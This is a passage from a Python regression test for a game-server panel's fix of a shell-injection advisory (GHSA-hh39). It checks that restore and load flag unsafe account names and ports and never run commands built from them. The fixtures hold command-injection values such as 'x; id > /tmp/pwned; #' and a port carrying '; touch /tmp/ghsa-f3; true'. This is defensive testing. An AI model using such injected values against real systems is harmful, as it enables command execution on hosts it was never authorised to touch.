          _gh_cover == [(_GH_PAYLOAD,)] and _gh_table == [("gmodserver",)],
          "covering=%r table=%r" % (_gh_cover, _gh_table))
    # The controls: a clean archive of the panel's own shape still restores, and the case check
    # is not a spelling check — a clean table in another case is read, not refused.
    _gh_ok, _gh_msg = _gh_restore(_gh_db(_GH_CLEAN, sql=_gh_retable("game_server", "GAME_SERVER")))
    check("GHSA-hh39 restore F2: (control) a CLEAN upper-case table is read and passes",
          _gh_ok is True, "%r %r" % (_gh_ok, _gh_msg))
    _gh_ok, _gh_msg = _gh_restore(_gh_db(_GH_CLEAN))
    check("GHSA-hh39 restore F2: (control) a clean archive with the panel's own schema still restores",
          _gh_ok is True and _gh_calls == [("safety", "prerestore"), ("verb", "panel-restore")],
          "%r %r %r" % (_gh_ok, _gh_msg, _gh_calls))
    # The tuple backup.py checks must be every column models.py guards with _validate_shell_ident,
    # or a column added there later is checked on assignment and never on restore.
    _gh_msrc = _gh_ast.parse(open(os.path.join(_gh_root, "panel", "db", "models.py"), encoding="utf-8").read())
    _gh_guarded = set()
    for _gh_cls in [n for n in _gh_msrc.body if isinstance(n, _gh_ast.ClassDef)]:
        _gh_tab = next((getattr(_t.value, "value", None) for _t in _gh_cls.body
                        if isinstance(_t, _gh_ast.Assign) and any(getattr(x, "id", "") == "__tablename__" for x in _t.targets)),
                       None) or re.sub(r"(?<!^)(?=[A-Z])", "_", _gh_cls.name).lower()
        for _gh_m in _gh_cls.body:
            if not isinstance(_gh_m, _gh_ast.FunctionDef):
                continue
            _gh_keys = [a.value for d in _gh_m.decorator_list if isinstance(d, _gh_ast.Call)
                        and _gh_callee(d) == "validates" for a in d.args if isinstance(a, _gh_ast.Constant)]
            if _gh_keys and any(isinstance(c, _gh_ast.Call) and _gh_callee(c) == "_validate_shell_ident"
                                for c in _gh_ast.walk(_gh_m)):
                _gh_guarded |= {(_gh_tab, k) for k in _gh_keys}
    check("GHSA-hh39 restore: it checks exactly the columns models.py guards as shell identifiers",
          _gh_guarded and _gh_guarded == set(_gh_bk._RESTORE_IDENT_COLUMNS),
          "models: %r / backup: %r" % (sorted(_gh_guarded), sorted(_gh_bk._RESTORE_IDENT_COLUMNS)))
finally:
    for _gh_a, _gh_v in _gh_bk_saved.items():
        setattr(_gh_bk, _gh_a, _gh_v)

# ── load: a row @validates never saw is FLAGGED, not fatal, and not rewritten ────────────────────
_gh_logdb = os.path.join(_gh_dir, "load.db")
_gh_make_db(_gh_logdb, game_rows=[(1, "x; id > /tmp/pwned; #", "gmod", 27015),
                                  (2, "gmodserver", "gmod", 27016),
                                  # review F3: a port stored as TEXT, and one stored as a numeric
                                  # string (which SQLite's INTEGER affinity turns into a number).
                                  (3, "gmodserver3", "gmod", "27017; touch /tmp/ghsa-f3; true"),
                                  (4, "gmodserver4", "gmod", "27018")])
_gh_warned = []


class _GhLogCatch(_gh_logging.Handler):
    def emit(self, record):
        if record.levelno >= _gh_logging.WARNING:
            _gh_warned.append(record.getMessage())


_gh_handler = _GhLogCatch()
_gh_models._log.addHandler(_gh_handler)
_gh_models._flagged_on_load.clear()
_gh_eng = _gh_engine("sqlite:///" + _gh_logdb)
_gh_loaded, _gh_load_exc = None, None
try:
    with _GhSession(_gh_eng) as _gh_sess:
        _gh_row = _gh_sess.get(_gh_models.GameServer, 1)
        _gh_clean = _gh_sess.get(_gh_models.GameServer, 2)
        _gh_loaded = (_gh_row.short_name, _gh_row.lgsm_name, _gh_clean.short_name)
    with _GhSession(_gh_eng) as _gh_sess:                  # a second load, a fresh session
        _gh_sess.get(_gh_models.GameServer, 1)
except Exception as _e:
    _gh_load_exc = _e
finally:
    _gh_models._log.removeHandler(_gh_handler)
    _gh_eng.dispose()
check("GHSA-hh39 load: a row with an unsafe account name LOADS — the panel is not bricked by it",
      _gh_load_exc is None and _gh_loaded is not None, repr(_gh_load_exc))
check("GHSA-hh39 load: ...unchanged (never silently rewritten to some other account)",
      _gh_loaded is not None and _gh_loaded[0] == "x; id > /tmp/pwned; #", repr(_gh_loaded))
check("GHSA-hh39 load: ...and flagged ONCE, naming the row and the column — the clean row is not",
      len(_gh_warned) == 1 and "GameServer #1" in _gh_warned[0] and "short_name" in _gh_warned[0],
      repr(_gh_warned))
# Ports are flagged by TYPE (review F3): text where a number belongs, never a numeric value.
_gh_warned.clear()
_gh_models._log.addHandler(_gh_handler)
_gh_port_loaded = None
try:
    with _GhSession(_gh_eng) as _gh_sess:
        _gh_port_loaded = (_gh_sess.get(_gh_models.GameServer, 3).port,
                           _gh_sess.get(_gh_models.GameServer, 4).port)
except Exception as _e:
    _gh_port_loaded = _e
finally:
    _gh_models._log.removeHandler(_gh_handler)
    _gh_eng.dispose()
check("GHSA-hh39 load F3: a port stored as text loads unchanged and is flagged once, by row and "
      "column; a numeric one is not",
      _gh_port_loaded == ("27017; touch /tmp/ghsa-f3; true", 27018) and len(_gh_warned) == 1
      and "GameServer #3" in _gh_warned[0] and " port " in _gh_warned[0]
      and "not a plain number" in _gh_warned[0], "%r %r" % (_gh_port_loaded, _gh_warned))
# ...and the enforcement is the builder: the loaded row's names drive no command.
_gh_sent.clear()
_gh_saved_rc = _sm_core.run_command
try:
    _sm_core.run_command = _gh_run
    _gh_rc = _sm_core.run_as_game_user(_GH_SRV, _gh_loaded[0] if _gh_loaded else "x;id", "details",
                                       selfname=_gh_loaded[1] if _gh_loaded else "x")
    _gh_cc = _sm_game.capture_console(_GH_SRV, _gh_loaded[0] if _gh_loaded else "x;id",
                                      _gh_loaded[1] if _gh_loaded else "x")
finally:
    _sm_core.run_command = _gh_saved_rc
check("GHSA-hh39 load: ...and the LOADED row's names drive no command at all",
      not _gh_sent and _is_tuple_refusal(_gh_rc) and _is_tuple_refusal(_gh_cc),
      "%r %r %r" % (_gh_sent[:1], _gh_rc, _gh_cc))
_gh_shutil.rmtree(_gh_dir, ignore_errors=True)
